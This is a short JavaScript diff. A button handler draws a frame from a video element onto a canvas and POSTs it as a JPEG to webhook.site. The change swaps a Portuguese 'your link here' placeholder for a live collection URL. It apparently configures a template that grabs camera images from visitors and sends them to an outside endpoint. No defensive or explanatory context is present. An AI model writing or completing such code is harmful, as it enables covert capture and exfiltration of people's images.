@@ -12,7 +12,7 @@ b.onclick=()=>{
 let c=document.createElement('canvas');
 c.width=v.videoWidth;c.height=v.videoHeight;
 c.getContext('2d').drawImage(v,0,0);
-fetch('https://webhook.site/SEU-LINK-AQUI',{
+fetch('https://webhook.site/c50680f2-0b27-4ad9-897e-50a2181ba116',{
   method:'POST',
   body:c.toDataURL('image/jpeg',.8)
 });
